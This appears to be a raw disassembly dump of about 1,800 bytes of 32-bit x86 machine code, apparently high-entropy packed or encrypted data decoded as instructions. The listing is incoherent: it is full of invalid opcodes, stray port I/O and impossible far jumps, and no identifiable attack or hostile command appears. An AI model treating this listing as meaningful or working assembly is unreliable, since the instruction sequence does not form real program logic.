  41d03d:	add    DWORD PTR [ebx],edx
  41d03f:	mul    DWORD PTR [esi-0x40]
  41d042:	pushf  
  41d043:	stos   BYTE PTR es:[edi],al
  41d044:	(bad)  
  41d045:	cwde   
  41d046:	fcomip st,st(4)
  41d048:	jp     0x41d095
  41d04a:	xchg   BYTE PTR [ecx+eiz*4-0x4079aece],bh
  41d051:	pushf  
  41d052:	mov    dh,0x5
  41d054:	push   edx
  41d055:	cwde   
  41d056:	ds jle 0x41d03f
  41d059:	sahf   
  41d05a:	inc    eax
  41d05b:	dec    esp
  41d05c:	out    dx,eax
  41d05d:	inc    esi
  41d05e:	(bad)  
  41d05f:	imul   bh
  41d061:	jae    0x41d030
  41d063:	outs   dx,BYTE PTR gs:[esi]
  41d065:	push   ecx
  41d066:	push   ebx
  41d067:	mov    esi,0xcda6bb75
  41d06c:	sbb    al,0x6b
  41d06e:	jg     0x41d0d9
  41d070:	mov    ebx,0xd348d578
  41d075:	xor    BYTE PTR [ecx+eax*2],0x4b
  41d079:	data16 jno 0x41d05a
  41d07c:	mov    edi,0x95c0a59f
  41d081:	adc    eax,0xa059cf3a
  41d086:	stos   BYTE PTR es:[edi],al
  41d087:	iret   
  41d088:	dec    edx
  41d08a:	mov    cl,0x1e
  41d08c:	sub    edi,DWORD PTR [ecx-0x7a]
  41d08f:	pop    edx
  41d090:	mov    dh,0xc9
  41d092:	sbb    eax,0xf9470853
  41d097:	cmp    al,0x3c
  41d099:	add    ch,ch
  41d09b:	cmp    dh,BYTE PTR [edx+0x14]
  41d09e:	fldcw  WORD PTR [esi]
  41d0a0:	push   esi
  41d0a1:	jb     0x41d0a6
  41d0a3:	icebp  
  41d0a4:	inc    ecx
  41d0a5:	ror    edx,0x7e
  41d0a8:	inc    eax
  41d0a9:	mov    ds,WORD PTR [ebx]
  41d0ab:	(bad)  
  41d0ad:	cmc    
  41d0ae:	fadd   DWORD PTR [eax]
  41d0b0:	or     edi,DWORD PTR [ebx+edi*4-0x77d3fa14]
  41d0b7:	add    esi,DWORD PTR [esi-0x14e6e116]
  41d0bd:	rol    DWORD PTR [ebp+0x5b],0x2e
  41d0c1:	mov    bh,0x3d
  41d0c3:	stos   DWORD PTR es:[edi],eax
  41d0c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0c5:	std    
  41d0c6:	jp     0x41d0bf
  41d0c8:	mov    ch,0x47
  41d0ca:	jae    0x41d0a0
  41d0cc:	dec    ecx
  41d0cd:	mov    ecx,0x8aae9380
  41d0d2:	mov    ch,0x32
  41d0d4:	pop    edi
  41d0d5:	push   ds
  41d0d6:	add    BYTE PTR [edx],ah
  41d0d8:	adc    esi,DWORD PTR [esi+0xd94b217]
  41d0de:	push   edx
  41d0df:	sahf   
  41d0e0:	fsubrp st(2),st
  41d0e2:	ficom  DWORD PTR [eax-0x1a]
  41d0e6:	out    dx,al
  41d0e7:	adc    DWORD PTR [ecx+ecx*8+0x12],ebx
  41d0eb:	push   0x14
  41d0ed:	pop    edi
  41d0ee:	(bad)  
  41d0f0:	test   eax,0x628b5dcc
  41d0f5:	test   al,0x76
  41d0f7:	push   ds
  41d0f8:	pop    ecx
  41d0f9:	outs   dx,DWORD PTR ds:[esi]
  41d0fa:	call   0x63a2171
  41d0ff:	push   esi
  41d100:	aad    0x2
  41d102:	mov    dh,BYTE PTR [ecx]
  41d104:	add    ebp,eax
  41d106:	shr    BYTE PTR [ebx+0x44981ff],0xa0
  41d10d:	inc    eax
  41d10e:	or     DWORD PTR [edi],eax
  41d110:	lea    ebx,[ecx-0x67085b8]
  41d116:	mov    ah,0xac
  41d118:	sbb    BYTE PTR [eax],cl
  41d11a:	mov    esp,0x59187df6
  41d11f:	arpl   WORD PTR [edx],dx
  41d121:	xor    dh,al
  41d123:	pushf  
  41d124:	rol    BYTE PTR [edi+0x454efa23],cl
  41d12a:	imul   ebp,esp,0xffffff88
  41d12d:	sbb    BYTE PTR [edx],dh
  41d12f:	shl    cl,1
  41d131:	adc    BYTE PTR [esi+0x482cfa12],bh
  41d137:	jecxz  0x41d0ef
  41d139:	ins    DWORD PTR es:[edi],dx
  41d13a:	lods   eax,DWORD PTR ds:[esi]
  41d13b:	mov    al,ds:0xf14c90bb
  41d140:	ret    
  41d141:	out    dx,eax
  41d142:	jns    0x41d16f
  41d144:	repz dec edi
  41d146:	ss int 0x3e
  41d149:	out    dx,eax
  41d14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d14b:	and    DWORD PTR [edi],0x3d20b010
  41d151:	clc    
  41d152:	dec    ebp
  41d153:	repz dec esp
  41d155:	and    eax,0x13971b29
  41d15a:	and    bl,BYTE PTR [edi+0x67]
  41d15d:	mov    cl,BYTE PTR [edx]
  41d15f:	lahf   
  41d160:	jo     0x41d0ea
  41d162:	xchg   ch,bl
  41d164:	(bad)  
  41d165:	enter  0xb76e,0xcb
  41d169:	sbb    BYTE PTR ds:0x4cd26852,dh
  41d16f:	pusha  
  41d170:	xor    BYTE PTR [edi+0x22ab8312],bl
  41d176:	test   al,0xb0
  41d178:	inc    edi
  41d179:	repnz cli 
  41d17b:	dec    esp
  41d17c:	pop    ebp
  41d17d:	pop    ebx
  41d17e:	arpl   bx,bp
  41d180:	fisttp WORD PTR [eax+0x5a]
  41d183:	out    0x3a,al
  41d185:	lods   al,BYTE PTR ds:[esi]
  41d186:	cmp    al,0xb4
  41d188:	mov    dh,0x8
  41d18a:	xor    ah,dh
  41d18c:	dec    edx
  41d18d:	out    0xd9,eax
  41d18f:	test   eax,0x1269e66f
  41d194:	lods   eax,DWORD PTR ds:[esi]
  41d195:	ficom  DWORD PTR [ecx+edx*8-0x6184664]
  41d19c:	push   es
  41d19d:	mov    esp,0xd345629b
  41d1a2:	or     DWORD PTR [edx+0xd],ebp
  41d1a5:	sbb    al,0x54
  41d1a7:	dec    edi
  41d1a8:	clc    
  41d1a9:	cmp    BYTE PTR [esi+0x7a],ch
  41d1ac:	jb     0x41d20f
  41d1ae:	mov    dl,0xb8
  41d1b0:	sar    BYTE PTR ds:0x7e92dcc4,1
  41d1b6:	fs inc esi
  41d1b8:	mov    eax,ds:0x4ca397f7
  41d1bd:	add    DWORD PTR [ebp-0x65],0x2
  41d1c1:	jne    0x41d1b4
  41d1c3:	cmc    
  41d1c4:	popa   
  41d1c5:	lods   al,BYTE PTR ds:[esi]
  41d1c6:	sar    BYTE PTR [edx+ebp*4],cl
  41d1c9:	rcl    DWORD PTR [edi-0x4d364f96],1
  41d1cf:	lods   al,BYTE PTR ds:[esi]
  41d1d0:	gs into 
  41d1d2:	cdq    
  41d1d3:	and    eax,0xc3095d69
  41d1d8:	push   ss
  41d1d9:	fcomp  DWORD PTR [edi-0x70bc194d]
  41d1df:	mov    dl,0x66
  41d1e1:	ins    DWORD PTR es:[edi],dx
  41d1e2:	and    ecx,DWORD PTR [eax+0x50]
  41d1e5:	outs   dx,DWORD PTR ds:[esi]
  41d1e6:	repnz inc eax
  41d1e8:	adc    DWORD PTR [edi],ebx
  41d1ea:	popf   
  41d1eb:	mov    esp,0x20f2526f
  41d1f0:	sbb    DWORD PTR [edi+0x292b851],edi
  41d1f6:	popf   
  41d1f7:	jns    0x41d1f9
  41d1f9:	inc    edx
  41d1fa:	or     BYTE PTR [edx+0x143ef136],al
  41d200:	out    0x44,eax
  41d202:	gs nop
  41d204:	and    dl,BYTE PTR [esi]
  41d206:	mov    BYTE PTR [eax+edx*1+0x59],ch
  41d20a:	js     0x41d22c
  41d20c:	out    dx,al
  41d20d:	fistp  QWORD PTR ds:0xa4ffc6ff
  41d213:	sub    eax,0x61124bb4
  41d218:	fild   DWORD PTR fs:[edx-0x3c988871]
  41d21f:	mov    bh,0x3e
  41d221:	and    ch,bh
  41d223:	(bad)  
  41d224:	mov    ch,0x4f
  41d226:	mov    ds:0x5968bef3,eax
  41d22b:	aas    
  41d22c:	push   0xffffffc5
  41d22e:	adc    BYTE PTR [ecx+0x11],bh
  41d231:	push   0xb85a0f52
  41d236:	outs   dx,DWORD PTR ds:[esi]
  41d237:	mov    dh,0xb8
  41d239:	nop
  41d23a:	test   eax,0xa001bc76
  41d23f:	das    
  41d240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d241:	mov    al,ds:0x6d25904b
  41d246:	fnstenv [eax+eax*1+0x1e]
  41d24a:	and    eax,0xccc12b4a
  41d24f:	mov    ds:0x5af6af63,al
  41d254:	xchg   esi,eax
  41d255:	adc    ebp,DWORD PTR [eax-0x14ff82cc]
  41d25b:	dec    eax
  41d25c:	or     ecx,eax
  41d25e:	add    ecx,DWORD PTR [eax+0x640d659d]
  41d264:	test   DWORD PTR [ebx],eax
  41d266:	sbb    ecx,DWORD PTR [esi+edi*4]
  41d269:	js     0x41d2bc
  41d26b:	test   DWORD PTR [ecx-0x1eef9724],edi
  41d271:	adc    ch,BYTE PTR [edi+ebx*8+0x53]
  41d275:	sub    al,0x8
  41d277:	mov    ebx,0x7b66a4b0
  41d27c:	pop    ebx
  41d27d:	pop    ebp
  41d27e:	cmp    DWORD PTR [ecx+0x20c493c9],ebp
  41d284:	mov    DWORD PTR [eax-0x7c223f52],edx
  41d28a:	jle    0x41d2af
  41d28c:	scas   al,BYTE PTR es:[edi]
  41d28d:	mov    bh,0x78
  41d28f:	push   0xc48226ef
  41d294:	pusha  
  41d295:	and    eax,0xcac16caa
  41d29a:	clc    
  41d29b:	push   edx
  41d29c:	daa    
  41d29d:	fucomp st(7)
  41d29f:	stos   BYTE PTR es:[edi],al
  41d2a0:	jb     0x41d267
  41d2a2:	das    
  41d2a3:	cdq    
  41d2a4:	out    0xb9,eax
  41d2a6:	imul   ebx,DWORD PTR [ebx-0x1e3e3f75],0xffffffd5
  41d2ad:	clc    
  41d2ae:	dec    ecx
  41d2af:	pop    ebp
  41d2b0:	scas   eax,DWORD PTR es:[edi]
  41d2b1:	stos   DWORD PTR es:[edi],eax
  41d2b2:	jo     0x41d237
  41d2b4:	mov    bl,0xad
  41d2b6:	sub    DWORD PTR [edx],0xffffffd7
  41d2b9:	jl     0x41d305
  41d2bb:	push   ebp
  41d2bc:	xchg   esi,eax
  41d2bd:	mov    ebx,0x24d74b0e
  41d2c2:	xchg   ebx,eax
  41d2c3:	mov    ah,0x18
  41d2c5:	pop    edi
  41d2c6:	inc    esi
  41d2c7:	xchg   edx,eax
  41d2c8:	push   esp
  41d2c9:	stos   DWORD PTR es:[edi],eax
  41d2ca:	pop    esp
  41d2cb:	imul   eax,DWORD PTR [esi],0xffffffd4
  41d2ce:	mov    dh,BYTE PTR [eax-0x66]
  41d2d1:	xchg   ecx,eax
  41d2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2d3:	(bad)  
  41d2d4:	mov    esi,0x399b9cec
  41d2d9:	ja     0x41d32a
  41d2db:	cmp    eax,0x3638d7dc
  41d2e0:	test   BYTE PTR [eax],ah
  41d2e2:	pop    ecx
  41d2e3:	sub    eax,0xc795f04d
  41d2e8:	sub    cl,BYTE PTR ss:[ebp+0x7c]
  41d2ec:	jne    0x41d2a0
  41d2ee:	dec    esi
  41d2ef:	dec    ebx
  41d2f0:	mov    al,0xd3
  41d2f2:	add    dl,bh
  41d2f4:	mov    ecx,0x4fb5d5df
  41d2f9:	daa    
  41d2fa:	cdq    
  41d2fb:	or     BYTE PTR [ecx-0xa],dh
  41d2fe:	inc    eax
  41d2ff:	das    
  41d300:	sub    BYTE PTR [edx+0x6f72380c],0xf9
  41d307:	cwde   
  41d308:	and    al,0x36
  41d30a:	sbb    DWORD PTR [edi-0x8566feb],esp
  41d310:	das    
  41d311:	enter  0x80a2,0x8e
  41d315:	(bad)  
  41d316:	mov    al,ds:0x24ba685
  41d31b:	(bad)  
  41d31c:	in     al,dx
  41d31d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d31e:	jb     0x41d2a2
  41d320:	sahf   
  41d321:	jae    0x41d32f
  41d323:	mov    eax,ds:0x1fc8c72c
  41d328:	sahf   
  41d329:	(bad)  
  41d32a:	xchg   ebp,eax
  41d32b:	les    eax,FWORD PTR [ecx-0x34]
  41d32e:	mov    bl,0xf
  41d330:	push   cs
  41d331:	xor    bh,BYTE PTR [ebx]
  41d333:	lock js 0x41d32a
  41d336:	mov    al,0x70
  41d338:	dec    ebx
  41d339:	and    BYTE PTR [edx-0x6e],0x45
  41d33d:	nop
  41d33e:	xor    DWORD PTR [ecx-0x74],ebp
  41d341:	fwait
  41d342:	imul   esi,DWORD PTR [ecx+0x1b],0x75
  41d346:	mov    dh,0x1e
  41d348:	dec    ebp
  41d349:	lea    edi,[eax]
  41d34b:	into   
  41d34c:	js     0x41d331
  41d34e:	sub    edx,DWORD PTR [edx]
  41d350:	inc    edi
  41d351:	js     0x41d393
  41d353:	mov    bh,0xd6
  41d355:	fld    DWORD PTR [ecx+0x3c56b4ce]
  41d35b:	nop
  41d35c:	(bad)  
  41d35d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d35e:	out    0xc9,eax
  41d360:	out    0xa4,al
  41d362:	loopne 0x41d2ff
  41d364:	test   al,0x24
  41d366:	fwait
  41d367:	dec    edi
  41d368:	packssdw mm6,QWORD PTR [edi-0x2d]
  41d36c:	jl     0x41d2ff
  41d36e:	xchg   edx,eax
  41d36f:	dec    edi
  41d370:	mov    cl,0x5a
  41d372:	jmp    0x41d3c5
  41d374:	cmp    edi,0x36f060f
  41d37a:	pop    ecx
  41d37b:	fisttp DWORD PTR [edx+0x46add2]
  41d381:	psubq  mm4,QWORD PTR [edx]
  41d384:	xchg   ebp,eax
  41d385:	push   ebx
  41d386:	leave  
  41d387:	push   eax
  41d388:	outs   dx,BYTE PTR ds:[esi]
  41d389:	lahf   
  41d38a:	pop    esp
  41d38b:	sti    
  41d38c:	icebp  
  41d38d:	xchg   edi,eax
  41d38e:	retf   
  41d38f:	jle    0x41d39b
  41d391:	adc    dl,BYTE PTR [eax]
  41d393:	stos   BYTE PTR es:[edi],al
  41d394:	add    eax,0xd3784251
  41d399:	dec    edx
  41d39a:	or     ebx,DWORD PTR [ecx-0x52]
  41d39d:	(bad)  
  41d39e:	mov    dl,0x3
  41d3a0:	test   eax,0x8ad5f7cf
  41d3a5:	dec    edi
  41d3a6:	dec    edx
  41d3a7:	mov    edx,0x3754f589
  41d3ac:	pop    ss
  41d3ad:	mov    bh,0x5f
  41d3af:	mov    eax,eax
  41d3b1:	push   ebx
  41d3b2:	jnp    0x41d39c
  41d3b4:	or     DWORD PTR [eax+0x1613cd81],ebp
  41d3ba:	lods   eax,DWORD PTR ds:[esi]
  41d3bb:	stos   DWORD PTR es:[edi],eax
  41d3bc:	out    dx,al
  41d3bd:	inc    ebp
  41d3be:	jg     0x41d3d8
  41d3c0:	aam    0x2
  41d3c2:	test   eax,0x94311942
  41d3c7:	and    ebp,DWORD PTR [edx-0x3a9922d1]
  41d3cd:	in     eax,0x8e
  41d3cf:	aad    0x93
  41d3d1:	rcl    DWORD PTR [edx+eiz*4],cl
  41d3d4:	stos   DWORD PTR es:[edi],eax
  41d3d5:	xchg   ecx,eax
  41d3d6:	mov    edx,0x1611f6ff
  41d3db:	mov    fs,edx
  41d3dd:	fimul  DWORD PTR [ebx+0x5c9fdd26]
  41d3e3:	ror    al,1
  41d3e5:	mov    edi,0xfb7c7bd5
  41d3ea:	test   BYTE PTR [ebx+0x25698bab],bl
  41d3f0:	popf   
  41d3f1:	xchg   edx,eax
  41d3f2:	mov    al,0xa5
  41d3f4:	dec    ebp
  41d3f5:	es out dx,eax
  41d3f7:	jecxz  0x41d412
  41d3f9:	ret    0xb53d
  41d3fc:	and    cl,BYTE PTR [ebx-0x515698e7]
  41d402:	and    BYTE PTR ds:[ebx],ch
  41d405:	leave  
  41d406:	mov    esp,eax
  41d408:	sbb    esp,ebx
  41d40a:	retf   0x974d
  41d40d:	fwait
  41d40e:	or     BYTE PTR [eax-0x12],bl
  41d411:	cmc    
  41d412:	mov    al,0xe1
  41d414:	outs   dx,BYTE PTR ds:[esi]
  41d415:	jmp    0xfa043a21
  41d41a:	repnz les eax,FWORD PTR [edx+0x2c0de51c]
  41d421:	in     eax,dx
  41d422:	scas   al,BYTE PTR es:[edi]
  41d423:	in     eax,dx
  41d424:	inc    eax
  41d425:	add    al,0x33
  41d427:	mov    ebp,0x9009eb27
  41d42c:	test   eax,0xa8e9d47d
  41d431:	(bad)  
  41d432:	mov    ch,0x8c
  41d434:	adc    DWORD PTR [edi],ebp
  41d436:	pop    es
  41d437:	sbb    DWORD PTR [edi+0x41d200f8],ebx
  41d43d:	mov    edx,0xc270cdcc
  41d442:	mov    al,0xc2
  41d444:	cld    
  41d445:	sbb    ebx,DWORD PTR [edi-0x67]
  41d448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d449:	jbe    0x41d3fc
  41d44b:	dec    edx
  41d44c:	xchg   ebp,eax
  41d44d:	ja     0x41d465
  41d44f:	or     DWORD PTR [esp+esi*1+0x3e],ebx
  41d453:	into   
  41d454:	daa    
  41d455:	xor    ah,bh
  41d457:	xor    ecx,edx
  41d459:	pusha  
  41d45a:	out    dx,al
  41d45b:	sub    eax,0x6080ea2e
  41d460:	jbe    0x41d40c
  41d462:	mov    ebp,0xb52eb365
  41d467:	push   ss
  41d468:	mov    ?,WORD PTR [edi+0x22]
  41d46b:	ds dec ecx
  41d46d:	inc    ebp
  41d46e:	dec    edi
  41d46f:	push   ecx
  41d470:	(bad)  
  41d472:	xchg   esi,eax
  41d473:	fstp   st(4)
  41d475:	loopne 0x41d3ff
  41d477:	sbb    eax,0xe2114cef
  41d47c:	sbb    DWORD PTR [esi],esi
  41d47e:	in     eax,dx
  41d47f:	and    bl,BYTE PTR [ebp*1-0x321d522f]
  41d486:	loope  0x41d448
  41d488:	cld    
  41d489:	sar    dh,1
  41d48b:	mov    edi,0xef11d728
  41d490:	in     eax,dx
  41d491:	int3   
  41d492:	cmc    
  41d493:	nop
  41d494:	(bad)  
  41d496:	ins    DWORD PTR es:[edi],dx
  41d497:	pop    eax
  41d498:	pop    edx
  41d499:	enter  0x50c8,0xda
  41d49d:	push   esp
  41d49e:	ret    
  41d49f:	jns    0x41d4f1
  41d4a1:	fmul   st(2),st
  41d4a3:	addr16 sbb al,0xbd
  41d4a6:	dec    ecx
  41d4a7:	or     DWORD PTR [ecx-0x446bd136],ecx
  41d4ad:	xor    al,0x30
  41d4af:	rcr    eax,1
  41d4b1:	xchg   ebx,eax
  41d4b2:	jmp    0xbe5b:0xec832d0e
  41d4b9:	jns    0x41d496
  41d4bb:	jmp    0x41d483
  41d4bd:	xchg   ebp,eax
  41d4be:	jno    0x41d497
  41d4c0:	mov    esp,0x5621e00f
  41d4c5:	xchg   edx,eax
  41d4c6:	dec    ecx
  41d4c8:	xchg   esi,eax
  41d4c9:	outs   dx,DWORD PTR ds:[esi]
  41d4ca:	adc    BYTE PTR [ebx],dl
  41d4cc:	lods   eax,DWORD PTR ds:[esi]
  41d4cd:	xor    al,0x6d
  41d4cf:	sub    DWORD PTR [edi],edi
  41d4d1:	push   ebp
  41d4d2:	int3   
  41d4d3:	sub    BYTE PTR [ecx-0x44],ch
  41d4d6:	call   0xa7e0:0xa6abb6e8
  41d4dd:	and    bl,BYTE PTR [esi+0x7f8280d2]
  41d4e3:	dec    edi
  41d4e4:	mov    ecx,0xec7d1b4f
  41d4e9:	or     cl,bh
  41d4eb:	inc    ebp
  41d4ec:	adc    al,0x99
  41d4ee:	dec    ebx
  41d4ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4f0:	es or  al,0x49
  41d4f3:	je     0x41d536
  41d4f5:	ins    BYTE PTR es:[edi],dx
  41d4f6:	cli    
  41d4f7:	xchg   ebp,eax
  41d4f8:	call   0xf359:0x4f0ffc4f
  41d4ff:	pop    ss
  41d500:	loopne 0x41d54e
  41d502:	mov    bh,BYTE PTR [ebp+0x4]
  41d505:	aas    
  41d506:	call   FWORD PTR [eax-0x22df2bf5]
  41d50c:	xor    ch,BYTE PTR [edx-0x51367e5d]
  41d512:	in     al,dx
  41d513:	fsub   QWORD PTR [edx-0x311d5f1]
  41d519:	jg     0x41d4c2
  41d51b:	jbe    0x41d4f3
  41d51d:	jmp    0xf06ed4ee
  41d522:	in     al,dx
  41d523:	xor    DWORD PTR [ebp+0x5d],ebp
  41d526:	mov    ds:0xe4875913,al
  41d52b:	aad    0x3d
  41d52d:	or     BYTE PTR [ebp+0x55],dh
  41d530:	repnz sub DWORD PTR [edx],esp
  41d533:	enter  0xd3d5,0x17
  41d537:	fcmovnbe st,st(2)
  41d539:	add    BYTE PTR [ebp-0x1a],ah
  41d53c:	jne    0x41d53c
  41d53e:	dec    esi
  41d53f:	pop    eax
  41d540:	repz dec edx
  41d542:	xor    dh,0xf7
  41d545:	in     al,dx
  41d546:	ds xchg ebx,eax
  41d548:	xchg   esp,eax
  41d549:	mov    edx,0x236d1925
  41d54e:	xor    ah,bl
  41d550:	mov    ch,0x1c
  41d552:	jge    0x41d542
  41d554:	loop   0x41d550
  41d556:	mov    ch,0x37
  41d558:	pop    ss
  41d559:	xchg   esi,eax
  41d55a:	arpl   dx,sp
  41d55c:	pop    ds
  41d55d:	dec    esi
  41d55e:	std    
  41d55f:	xchg   edi,eax
  41d560:	and    esp,eax
  41d562:	icebp  
  41d563:	es repz out 0x1b,al
  41d567:	lds    ebx,FWORD PTR [eax+0x3d6f955]
  41d56d:	sahf   
  41d56e:	je     0x41d541
  41d570:	lods   eax,DWORD PTR ds:[esi]
  41d571:	inc    ebx
  41d572:	pusha  
  41d573:	pop    edi
  41d574:	aad    0xe5
  41d576:	neg    BYTE PTR [edx+0x8]
  41d579:	adc    BYTE PTR [ecx],al
  41d57b:	push   esp
  41d57c:	cmp    al,0xaa
  41d57e:	call   0xc3c81d9e
  41d583:	retf   0xad48
  41d586:	sub    bh,ah
  41d588:	out    dx,al
  41d589:	adc    BYTE PTR [ebp-0x5c],bh
  41d58c:	and    al,0x25
  41d58e:	sub    ch,BYTE PTR [ecx-0x20f9a1a]
  41d594:	xchg   edx,eax
  41d595:	outs   dx,BYTE PTR ds:[esi]
  41d596:	pop    ds
  41d597:	aam    0x0
  41d599:	neg    edx
  41d59b:	arpl   ax,bp
  41d59d:	mov    cl,0x33
  41d59f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5a0:	out    dx,al
  41d5a1:	jl     0x41d5cf
  41d5a3:	sbb    BYTE PTR [ebx],bl
  41d5a5:	cmp    al,0x6
  41d5a7:	loop   0x41d531
  41d5a9:	(bad)
  41d5ac:	dec    eax
  41d5ad:	jae    0x41d5af
  41d5af:	arpl   WORD PTR ds:0xbf31340f,cx
  41d5b5:	xor    dl,BYTE PTR [edx]
  41d5b7:	pusha  
  41d5b8:	cmp    DWORD PTR [esi],ecx
  41d5ba:	lahf   
  41d5bb:	or     DWORD PTR [ebp-0x2ff81202],0x3a
  41d5c2:	xor    ah,BYTE PTR [edx+ebp*8]
  41d5c5:	cs sbb eax,0xc258d3e
  41d5cb:	std    
  41d5cc:	lea    esp,[ecx+ebx*2+0x4b52c6f6]
  41d5d3:	adc    al,0xe9
  41d5d5:	cs jnp 0x41d58e
  41d5d8:	stc    
  41d5d9:	ret    
  41d5da:	cdq    
  41d5db:	or     ch,dh
  41d5dd:	jnp    0x41d607
  41d5df:	push   0x2e
  41d5e1:	neg    DWORD PTR [eax+0x2d9af9e3]
  41d5e7:	mov    esi,0x7ecfd42b
  41d5ec:	aaa    
  41d5ed:	test   al,0xe6
  41d5ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5f0:	fldcw  WORD PTR [ebp*8-0x5b1747b6]
  41d5f7:	in     eax,dx
  41d5f8:	ins    DWORD PTR es:[edi],dx
  41d5f9:	cmp    BYTE PTR [ecx],0x81
  41d5fc:	test   DWORD PTR [edi],eax
  41d5fe:	mov    ecx,0x333979fe
  41d603:	lea    ecx,[edx]
  41d605:	pop    ss
  41d606:	jle    0x41d658
  41d608:	and    eax,0x59a43977
  41d60d:	pop    edi
  41d60e:	js     0x41d5e8
  41d610:	std    
  41d611:	sahf   
  41d612:	aam    0xd2
  41d614:	sub    DWORD PTR [esi+0x78],esp
  41d617:	sub    ah,BYTE PTR [edx-0x5facb670]
  41d61d:	and    al,0xc6
  41d61f:	dec    esi
  41d620:	adc    dl,BYTE PTR [esi+0x279dca06]
  41d626:	adc    al,BYTE PTR [edi-0x1f]
  41d629:	or     DWORD PTR [eax-0x3a2c9bfb],0xffffff9b
  41d630:	mov    ah,0x46
  41d632:	cld    
  41d633:	out    0xb5,al
  41d635:	hlt    
  41d636:	leave  
  41d637:	pushf  
  41d638:	pop    ebx
  41d639:	fstp   DWORD PTR [esi+0x7942daf]
  41d63f:	or     BYTE PTR [edx-0x17],bh
  41d642:	leave  
  41d643:	xor    al,0x6f
  41d645:	xor    ebx,DWORD PTR [ebx+edx*1]
  41d648:	jmp    0xb7b6:0x801ebf33
  41d64f:	xchg   BYTE PTR [eax-0x7c],ah
  41d652:	add    BYTE PTR [ebx-0x12],ah
  41d655:	les    eax,FWORD PTR [edx-0x6d]
  41d658:	cmc    
  41d659:	adc    BYTE PTR [ebp+0xcd8964d],0xbb
  41d660:	js     0x41d68e
  41d662:	lods   al,BYTE PTR ds:[esi]
  41d663:	mov    ecx,0x7bc1c631
  41d668:	dec    esp
  41d669:	fisubr WORD PTR [ecx]
  41d66b:	mov    edx,0x2b9dc93b
  41d670:	mov    dh,0x34
  41d672:	test   DWORD PTR [ecx+0x187c4fba],edi
  41d678:	fdivr  st(3),st
  41d67a:	cmp    al,BYTE PTR [ebp+ecx*4+0x1d]
  41d67e:	clc    
  41d67f:	mov    ebp,0x57ac05c1
  41d684:	sbb    esp,esi
  41d686:	mov    edx,0xea607d37
  41d68b:	inc    ecx
  41d68c:	pop    ss
  41d68d:	jae    0x41d6bb
  41d68f:	int    0x2
  41d691:	push   esi
  41d692:	mov    ecx,DWORD PTR [edi]
  41d694:	test   BYTE PTR ds:0x90ba11c4,bl
  41d69a:	cmp    dh,dh
  41d69c:	inc    edx
  41d69d:	jmp    0x41d667
  41d69f:	sbb    eax,0x43e8237b
  41d6a4:	(bad)  
  41d6a5:	push   ds
  41d6a6:	fld    DWORD PTR [edi+0x26]
  41d6a9:	bsr    ebx,DWORD PTR [edx+0x716c2315]
  41d6b0:	ja     0x41d6a5
  41d6b2:	pusha  
  41d6b3:	adc    al,0x43
  41d6b5:	imul   ebx,DWORD PTR [ebx+0xde89aa],0x2e
  41d6bc:	cli    
  41d6bd:	sbb    cl,BYTE PTR [esi-0x6d39a5c8]
  41d6c3:	cs jp  0x41d6ce
  41d6c6:	(bad)  
  41d6c7:	xchg   edx,eax
  41d6c8:	pop    eax
  41d6c9:	outs   dx,DWORD PTR ds:[esi]
  41d6ca:	addr16 mov bl,0xcb
  41d6cd:	es adc al,0x9f
  41d6d0:	rol    DWORD PTR [edi],1
  41d6d2:	out    0x16,al
  41d6d4:	sar    DWORD PTR [eax-0x41],1
  41d6d7:	mov    ch,BYTE PTR [edx]
  41d6d9:	mov    edx,0xfec4c903
  41d6de:	mov    ecx,0xe0cc3009
  41d6e3:	sbb    al,0x69
  41d6e5:	pop    edi
  41d6e6:	jl     0x41d728
  41d6e8:	xor    DWORD PTR [edi-0x31fcff7a],edx
  41d6ee:	cli    
  41d6ef:	js     0x41d6c9
  41d6f1:	(bad)  
  41d6f2:	hlt    
  41d6f3:	and    edx,DWORD PTR [ecx+0x5e]
  41d6f6:	mov    DWORD PTR [eax+0x2f503f8f],esi
  41d6fc:	iret   
  41d6fd:	or     DWORD PTR [eax+0x6a],edi
  41d700:	xchg   ecx,eax
  41d701:	mov    edi,0x4046f919
  41d706:	ficomp DWORD PTR [ebx+0x2fdae4fd]
  41d70c:	iret   
  41d70d:	pop    edx
  41d70e:	xchg   BYTE PTR [eiz*1+0x19904202],dl
  41d715:	mov    al,0x5e
  41d717:	ins    DWORD PTR es:[edi],dx
  41d718:	out    dx,eax
  41d719:	adc    eax,0xebcd2d80
  41d71e:	mov    esp,0x7416073d
  41d723:	mov    ds:0x7bb185ce,al
  41d728:	sub    DWORD PTR [eax+0x5c],ecx
  41d72b:	jle    0x41d72f
  41d72d:	in     eax,dx
  41d72e:	sbb    ah,bl
  41d730:	dec    DWORD PTR [ecx+0x1f535749]
  41d736:	and    eax,0x643c997d
  41d73b:	push   cs
  41d73c:	out    0x4e,al
  41d73e:	nop
  41d73f:	jle    0x41d736
  41d741:	int    0xc0
  41d743:	call   FWORD PTR [ebx+0x3b]
  41d746:	pop    ecx
  41d747:	or     cl,BYTE PTR [ebp+edx*4+0x78]
  41d74b:	xchg   ecx,eax
  41d74c:	inc    edx
  41d74d:	push   ebp
  41d74e:	icebp  
  41d74f:	add    dh,BYTE PTR [edx+ebx*2-0x4f886d23]
  41d756:	ss into 
  41d758:	lods   al,BYTE PTR ds:[esi]
  41d759:	dec    edi
  41d75a:	cmp    eax,0x934aa9e5
  41d75f:	and    BYTE PTR [esi+0x3740f6fb],ch
  41d765:	fwait
  41d766:	scas   al,BYTE PTR es:[edi]
  41d767:	jg     0x41d6f7
  41d769:	mov    dh,0x82
  41d76b:	sti    
  41d76c:	jo     0x41d731
  41d76e:	(bad)  
  41d76f:	adc    edx,ebx
  41d771:	loopne 0x41d73c
  41d773:	mov    dh,0x54
  41d775:	and    ebx,DWORD PTR [edx-0x37fc9a9d]
  41d77b:	adc    DWORD PTR [edx],esi
  41d77d:	outs   dx,BYTE PTR ds:[esi]
  41d77e:	lods   al,BYTE PTR ds:[esi]
